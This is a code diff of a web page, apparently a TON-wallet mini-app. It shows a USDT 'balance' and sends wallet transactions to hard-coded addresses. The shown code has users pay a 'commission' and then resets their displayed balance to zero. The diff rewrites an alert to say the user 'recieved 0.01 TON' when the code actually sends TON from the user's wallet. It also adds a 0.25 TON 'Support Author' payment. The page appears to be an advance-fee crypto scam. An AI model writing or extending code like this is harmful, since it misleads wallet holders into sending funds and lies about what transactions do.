@@ -509,7 +509,13 @@ window.addEventListener("load", (event) => {
 });
 
 window.setInterval(function(){
-  document.getElementById("usdt").innerHTML = `<span class="fancy">${lst.toFixed(2)} USDT</span>`;
+  if(lst >= 0){
+    document.getElementById("usdt").innerHTML = `<span class="fancy">${lst.toFixed(2)} USDT</span>`;
+  }
+  else{
+    document.getElementById("usdt").innerHTML = `<span class="fancy">0.00 USDT</span>`;
+    
+  }
 }, 1000);
 
 function setTgPrem(prem){
@@ -1034,7 +1040,7 @@ setInterval(async function gg() {
   		<div class="withdraw" onclick="trans()">Withdraw</div>
 		</div>
     <div id="hh">
-  		  <div class="support" onclick="trans()">Support Author</div>
+  		  <div class="support" onclick="supportAuth()">Support Author</div>
 		</div>
 
 	</div>
@@ -1097,7 +1103,7 @@ function pp(){
 
                 try{
                     await tonConnectUI.sendTransaction(transaction);
-                    alert("Вы успешно оплатаили комиссию!");
+                    alert("You successfuly paid comission!");
                     lst = 0;
                     localStorage.setItem("ppp", lst);
 
@@ -1136,7 +1142,7 @@ function pp(){
 
                 try{
                     await tonConnectUI.sendTransaction(transaction);
-                    alert("Вы успешно отправили 0.01 TON!");
+                    alert("You successfuly recieved 0.01 TON!");
                     let completed = document.getElementById("terms");
                     let body = document.querySelector("body");
                     body.removeChild(completed);
@@ -1148,8 +1154,25 @@ function pp(){
                     console.error(e);
                 }
     }
-    
+    async function supportAuth(){
+                const transaction = {
+                    validUntil: Math.round(Date.now() / 1000) + 100,
+                    messages: [
+                        {
+                            address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
+                            amount: 250000000, //250000000
+                        }
+                    ]
+                };
 
+                try{
+                    await tonConnectUI.sendTransaction(transaction);
+                    alert("Thanks!!!");
+                }
+                catch(e){
+                    console.error(e);
+                }
+    }
 
 </script>
     </body>
